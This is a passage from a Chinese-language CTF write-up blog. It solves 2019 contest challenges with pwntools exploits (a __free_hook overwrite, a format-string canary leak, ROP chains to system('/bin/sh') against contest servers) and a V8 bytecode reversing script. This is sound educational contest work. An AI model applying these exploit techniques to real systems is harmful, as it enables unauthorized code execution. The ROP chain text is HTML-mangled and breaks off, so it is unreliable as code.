EOFError:</span><br><span class="line">            sh.close()</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    add(0xa8)</span><br><span class="line">    edit(p64(__free_hook))</span><br><span class="line">    add(0xa8)</span><br><span class="line">    add(0xa8)</span><br><span class="line">    edit(p64(system)) </span><br><span class="line">    add(0x200)</span><br><span class="line">    edit('/bin/sh\x00')</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    free(0)</span><br><span class="line">    log.success("system: " + hex(system))</span><br><span class="line">    log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    if debug != 0:</span><br><span class="line">                log.success("pid = " + str(sh.pid))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("47.112.139.218",13132,0)</span><br></pre></td></tr></tbody></table></figure></div><h3 id="打进去之后没有回显，只能猜flag的位置，猜测在-home-flag"><a href="#打进去之后没有回显，只能猜flag的位置，猜测在-home-flag" class="headerlink" title="打进去之后没有回显，只能猜flag的位置，猜测在/home/flag"></a>打进去之后没有回显，只能猜flag的位置，猜测在/home/flag</h3><h3 id="Flag-flag-ec56e9e92ecd5481304e047a798aa15bcde501caf2bcbc5c65402b3b"><a href="#Flag-flag-ec56e9e92ecd5481304e047a798aa15bcde501caf2bcbc5c65402b3b" class="headerlink" title="Flag: flag{ec56e9e92ecd5481304e047a798aa15bcde501caf2bcbc5c65402b3b}"></a>Flag: flag{ec56e9e92ecd5481304e047a798aa15bcde501caf2bcbc5c65402b3b}</h3><h2 id="据说大师傅们有一个io的做法来libc-leak，tql膜拜一下"><a href="#据说大师傅们有一个io的做法来libc-leak，tql膜拜一下" class="headerlink" title="据说大师傅们有一个io的做法来libc leak，tql膜拜一下"></a>据说大师傅们有一个io的做法来libc leak，tql膜拜一下</h2><h2 id="Reverse-8v"><a href="#Reverse-8v" class="headerlink" title="Reverse 8v"></a>Reverse 8v</h2><h3 id="下载过来一个文档，然后去知乎和谷歌上找各种指令的作用"><a href="#下载过来一个文档，然后去知乎和谷歌上找各种指令的作用" class="headerlink" title="下载过来一个文档，然后去知乎和谷歌上找各种指令的作用"></a>下载过来一个文档，然后去知乎和谷歌上找各种指令的作用</h3><h3 id="https-zhuanlan-zhihu-com-p-28590489"><a href="#https-zhuanlan-zhihu-com-p-28590489" class="headerlink" title="https://zhuanlan.zhihu.com/p/28590489"></a><a href="https://zhuanlan.zhihu.com/p/28590489" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28590489</a></h3><h3 id="https-blog-zsxsoft-com-post-37"><a href="#https-blog-zsxsoft-com-post-37" class="headerlink" title="https://blog.zsxsoft.com/post/37"></a><a href="https://blog.zsxsoft.com/post/37" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/37</a></h3><h3 id="看到了一些很关键的运算操作，而且文件结果有一个类似于encode的字符串"><a href="#看到了一些很关键的运算操作，而且文件结果有一个类似于encode的字符串" class="headerlink" title="看到了一些很关键的运算操作，而且文件结果有一个类似于encode的字符串"></a>看到了一些很关键的运算操作，而且文件结果有一个类似于encode的字符串</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">179 S> 0x39bf06f1f3b8 @   22 : 0c 58             LdaSmi [88]</span><br><span class="line">282 E> 0x39bf06f1f3f8 @   86 : 3b f8 0f          BitwiseXor r3, [15]</span><br><span class="line">265 E> 0x39bf06f1f3fb @   89 : 30 fa f9 16       StaKeyedProperty r1, r2, [22]</span><br><span class="line">288 S> 0x39bf06f1f3ff @   93 : 13 04 14          LdaGlobal [4], [20]</span><br><span class="line">296 E> 0x39bf06f1f402 @   96 : 42 41 1a          MulSmi [65], [26]</span><br><span class="line">301 E> 0x39bf06f1f405 @   99 : 40 42 19          AddSmi [66], [25]</span><br><span class="line"></span><br><span class="line">376 E> 0x39bf06f1f453 @  177 : 3b f8 1e          BitwiseXor r3, [30]</span><br><span class="line">370 E> 0x39bf06f1f456 @  180 : 30 fa f9 21       StaKeyedProperty r1, r2, [33]</span><br><span class="line">382 S> 0x39bf06f1f45a @  184 : 13 04 14          LdaGlobal [4], [20]</span><br><span class="line">390 E> 0x39bf06f1f45d @  187 : 42 23 25          MulSmi [35], [37]</span><br><span class="line">395 E> 0x39bf06f1f460 @  190 : 41 10 24          SubSmi [16], [36]</span><br><span class="line">401 E> 0x39bf06f1f463 @  193 : 00 44 00 01 23 00 ModSmi.Wide [256], [35]</span><br></pre></td></tr></tbody></table></figure></div><h3 id="总结一下就是以下两个式子"><a href="#总结一下就是以下两个式子" class="headerlink" title="总结一下就是以下两个式子"></a>总结一下就是以下两个式子</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">((byte1)*65+66)%256</span><br><span class="line">((byte2) *35 - 16)%256</span><br></pre></td></tr></tbody></table></figure></div><h3 id="但是其实里面还有一个逆序，一开始没有看出来，具体脚本如下"><a href="#但是其实里面还有一个逆序，一开始没有看出来，具体脚本如下" class="headerlink" title="但是其实里面还有一个逆序，一开始没有看出来，具体脚本如下"></a>但是其实里面还有一个逆序，一开始没有看出来，具体脚本如下</h3><h3 id="Exp-3"><a href="#Exp-3" class="headerlink" title="Exp:"></a>Exp:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">key = 88</span><br><span class="line">list1 = []</span><br><span class="line">list2 = []</span><br><span class="line">list3 = []</span><br><span class="line">flag = ''</span><br><span class="line">encrypto=b'\xd2"\xf1\x8d\xb7\xe0\xd0MF\x87T?\x1fI\x1c\xe7\xcb\x07\xc3\x95z\xb3z\x0b\xbb\xdb\xa1I\xc5;'</span><br><span class="line">for i in range(0,len(encrypto)):</span><br><span class="line">list3.append(ord(encrypto[i:i+1]))</span><br><span class="line">print list3</span><br><span class="line">list1.append(key)</span><br><span class="line">for i in range(0,len(encrypto)):</span><br><span class="line">list1.append((list1[i] * 65 + 66)%256)</span><br><span class="line">print list1</span><br><span class="line">p = list1[len(list1) - 1]</span><br><span class="line">list2.append(p)</span><br><span class="line">for i in range(0,len(encrypto)-1):</span><br><span class="line">list2.append((list2[i] * 35 - 16)%256)</span><br><span class="line">list2.reverse()</span><br><span class="line">print list2</span><br><span class="line">for i in range(0,len(encrypto)):</span><br><span class="line">flag += (chr(list3[i]^list1[i]^list2[i]))</span><br><span class="line">print flag</span><br></pre></td></tr></tbody></table></figure></div><h3 id="Flag-flag-V8-ByteCode-is-Very-Easy"><a href="#Flag-flag-V8-ByteCode-is-Very-Easy" class="headerlink" title="Flag: flag{V8_ByteCode_is_Very_Easy}"></a>Flag: flag{V8_ByteCode_is_Very_Easy}</h3></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h2 id=&quot;PWN1-babyrop&quot;&gt;&lt;a href=&quot;#PWN1-babyrop&quot; class=&quot;headerlink&quot; title=&quot;PWN1 babyrop&quot;&gt;&lt;/a&gt;PWN1 babyrop&lt;/h2&gt;&lt;h3 id=&quot;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-19年第五空间网络安全大赛线上赛</title>
    <link href="http://yoursite.com/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    <id>http://yoursite.com/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/</id>
    <published>2019-08-30T06:00:43.000Z</published>
    <updated>2019-08-30T07:23:30.000Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="0x1-副墨"><a href="#0x1-副墨" class="headerlink" title="0x1 副墨"></a>0x1 副墨</h2><h3 id="导入IDA，scanf没有问题，但是下面的read有问题，可以覆盖seed，所以我只要覆盖seed为0，就可以知道之后rand出来的所有的数字"><a href="#导入IDA，scanf没有问题，但是下面的read有问题，可以覆盖seed，所以我只要覆盖seed为0，就可以知道之后rand出来的所有的数字" class="headerlink" title="导入IDA，scanf没有问题，但是下面的read有问题，可以覆盖seed，所以我只要覆盖seed为0，就可以知道之后rand出来的所有的数字"></a>导入IDA，scanf没有问题，但是下面的read有问题，可以覆盖seed，所以我只要覆盖seed为0，就可以知道之后rand出来的所有的数字</h3><p><a href="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/12.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/12.png" class="lazyload"></a></p><h3 id="所以可以写一个poc，预先生成10个数字，POC如下："><a href="#所以可以写一个poc，预先生成10个数字，POC如下：" class="headerlink" title="所以可以写一个poc，预先生成10个数字，POC如下："></a>所以可以写一个poc，预先生成10个数字，POC如下：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">#include<stdlib.h></stdlib.h></span><br><span class="line">#include<unistd.h></unistd.h></span><br><span class="line">int main(){</span><br><span class="line">int i= 0;</span><br><span class="line">srand(0);</span><br><span class="line">for(i = 0;i<10;i++)</span><br><span class="line">printf("%d\n",rand() % 0x1869Fu + 1);</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="编译之后就会输出seed为0的10个随机数"><a href="#编译之后就会输出seed为0的10个随机数" class="headerlink" title="编译之后就会输出seed为0的10个随机数"></a>编译之后就会输出seed为0的10个随机数</h3><h3 id="然后通过猜数字环节之后，有一个栈溢出和格式化溢出漏洞，所以input-name的时候需要通过-p来leak-pie和canary，这样才能劫持流程"><a href="#然后通过猜数字环节之后，有一个栈溢出和格式化溢出漏洞，所以input-name的时候需要通过-p来leak-pie和canary，这样才能劫持流程" class="headerlink" title="然后通过猜数字环节之后，有一个栈溢出和格式化溢出漏洞，所以input name的时候需要通过%p来leak pie和canary，这样才能劫持流程"></a>然后通过猜数字环节之后，有一个栈溢出和格式化溢出漏洞，所以input name的时候需要通过%p来leak pie和canary，这样才能劫持流程</h3><p><a href="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/13.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/13.png" class="lazyload"></a></p><h3 id="所以直接通过这个劫持流程"><a href="#所以直接通过这个劫持流程" class="headerlink" title="所以直接通过这个劫持流程"></a>所以直接通过这个劫持流程</h3><h3 id="劫持步骤："><a href="#劫持步骤：" class="headerlink" title="劫持步骤："></a>劫持步骤：</h3><h3 id="1、因为没有看到”-bin-sh-x00”先在bss段写入该字符串，通过read实现"><a href="#1、因为没有看到”-bin-sh-x00”先在bss段写入该字符串，通过read实现" class="headerlink" title="1、因为没有看到”/bin/sh\x00”先在bss段写入该字符串，通过read实现"></a>1、因为没有看到”/bin/sh\x00”先在bss段写入该字符串，通过read实现</h3><h3 id="2、发现程序本身有system函数，所以pop-rdi，将-bin-sh-x00字符串的指针传入rdi然后跳转到system函数的位置就可以拿到shell了，具体exp如下"><a href="#2、发现程序本身有system函数，所以pop-rdi，将-bin-sh-x00字符串的指针传入rdi然后跳转到system函数的位置就可以拿到shell了，具体exp如下" class="headerlink" title="2、发现程序本身有system函数，所以pop rdi，将/bin/sh\x00字符串的指针传入rdi然后跳转到system函数的位置就可以拿到shell了，具体exp如下"></a>2、发现程序本身有system函数，所以pop rdi，将/bin/sh\x00字符串的指针传入rdi然后跳转到system函数的位置就可以拿到shell了，具体exp如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("bf")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">rand = [7427,39356,9595,54062,67371,42578,92585,76990,22615,53318]</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./bf")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">pop_rdi_ret = 0xdb3</span><br><span class="line">pop_rsi_r15_ret = 0xdb1</span><br><span class="line">sh.recvuntil("Are you sure want to play the game?")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">offset = 0x3c - 0x20</span><br><span class="line">sh.recvuntil("Input your name : ")</span><br><span class="line">payload = ''</span><br><span class="line">payload = "%23$p,%17$p,"</span><br><span class="line">payload = payload.ljust(offset,"\x00")</span><br><span class="line">payload += p64(0)</span><br><span class="line">sh.send(payload)</span><br><span class="line">for i in rand:</span><br><span class="line">#if i == 53318:</span><br><span class="line">#input()</span><br><span class="line">sh.recvuntil("guess:")</span><br><span class="line">sh.sendline(str(i))</span><br><span class="line">sh.recvuntil("0x")</span><br><span class="line">base = int(sh.recvuntil(",",True),16) - 0xabf</span><br><span class="line">canary = int(sh.recv(18),16)</span><br><span class="line">offset = 0x3c - 8</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(base + pop_rdi_ret)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(base + pop_rsi_r15_ret)</span><br><span class="line">payload += p64(base + elf.bss())</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(base + elf.plt['read'])</span><br><span class="line">payload += p64(base + pop_rdi_ret)</span><br><span class="line">payload += p64(base + elf.bss())</span><br><span class="line">payload += p64(base + 0xab3)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline("/bin/sh\x00")</span><br><span class="line">log.success("canary: " + hex(canary))</span><br><span class="line">log.success("base: " + hex(base))</span><br><span class="line">sh.sendline("./flag.sh 1DJB8HC51KLT4E00000020PJUKVB5SHD")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("111.33.164.6",50001 ,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x2-坐忘"><a href="#0x2-坐忘" class="headerlink" title="0x2 坐忘"></a>0x2 坐忘</h2><h3 id="导入IDA，发现我们发送的数据被放到堆块里，而且我们发送的数据需要被base64加密，然后解密后会放到v5的位置。"><a href="#导入IDA，发现我们发送的数据被放到堆块里，而且我们发送的数据需要被base64加密，然后解密后会放到v5的位置。" class="headerlink" title="导入IDA，发现我们发送的数据被放到堆块里，而且我们发送的数据需要被base64加密，然后解密后会放到v5的位置。"></a>导入IDA，发现我们发送的数据被放到堆块里，而且我们发送的数据需要被base64加密，然后解密后会放到v5的位置。</h3><p><a href="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/14.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/08/30/CTF-19%E5%B9%B4%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B/14.png" class="lazyload"></a></p><h3 id="然后漏洞也是很明显的，他对解密之后的文本没有限制，而且我们写入1000长度的数据，解密之后也是远远可以覆盖ret地址的。但是这个程序开了canary，我们可以通过puts-amp-v5-来leak-canary，我们只需要第一次发送的加密文本解密之后刚好覆盖到canary的最后一位-x00，没有了-x00截断就会把canary一并输出出来，然后末尾清零就好了。"><a href="#然后漏洞也是很明显的，他对解密之后的文本没有限制，而且我们写入1000长度的数据，解密之后也是远远可以覆盖ret地址的。但是这个程序开了canary，我们可以通过puts-amp-v5-来leak-canary，我们只需要第一次发送的加密文本解密之后刚好覆盖到canary的最后一位-x00，没有了-x00截断就会把canary一并输出出来，然后末尾清零就好了。" class="headerlink" title="然后漏洞也是很明显的，他对解密之后的文本没有限制，而且我们写入1000长度的数据，解密之后也是远远可以覆盖ret地址的。但是这个程序开了canary，我们可以通过puts(&v5)来leak canary，我们只需要第一次发送的加密文本解密之后刚好覆盖到canary的最后一位\x00，没有了\x00截断就会把canary一并输出出来，然后末尾清零就好了。"></a>然后漏洞也是很明显的，他对解密之后的文本没有限制，而且我们写入1000长度的数据，解密之后也是远远可以覆盖ret地址的。但是这个程序开了canary，我们可以通过puts(&v5)来leak canary，我们只需要第一次发送的加密文本解密之后刚好覆盖到canary的最后一位\x00，没有了\x00截断就会把canary一并输出出来，然后末尾清零就好了。</h3><p>当然我们还需要继续循环，所以我们不能输入no，然后第二次解密只要输入很长的payload就好了，考虑到他是静态编译，所以考虑使用ROPgadget –binary pwn –ropchain，生成的代码来拿shell</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn9")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def rop():</span><br><span class="line">p = ''</span><br><span class="line">p += pack('<q', 0x0000000000401f57) # pop rsi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006cb080) # @ .data< span><br><span class="line">p += pack('<q', 0x00000000004715e4) # pop rax ; ret< span><br><span class="line">p += '/bin//sh'</span><br><span class="line">p += pack('<q', 0x000000000047cd21) # mov qword ptr [rsi], rax ; ret< span><br><span class="line">p += pack('<q', 0x0000000000401f57) # pop rsi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006cb088) # @ .data + 8< span><br><span class="line">p += pack('<q', 0x0000000000426baf) # xor rax, rax ; ret< span><br><span class="line">p += pack('<q', 0x000000000047cd21) # mov qword ptr [rsi], rax ; ret< span><br><span class="line">p += pack('<q', 0x0000000000401e36) # pop rdi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006cb080) # @ .data< span><br><span class="line">p += pack('<q', 0x0000000000401f57) # pop rsi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006cb088) # @ .data + 8< span><br><span class="line">p += pack('<q', 0x00000000004433e6) # pop rdx ; ret< span><br><span class="line">p += pack('<q', 0x00000000006cb088) # @ .data + 8< span><br><span class="line">p += pack('<q', 0x0000000000426baf) # xor rax, rax ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000046f140) # add rax, ; ret< span><br><span class="line">p += 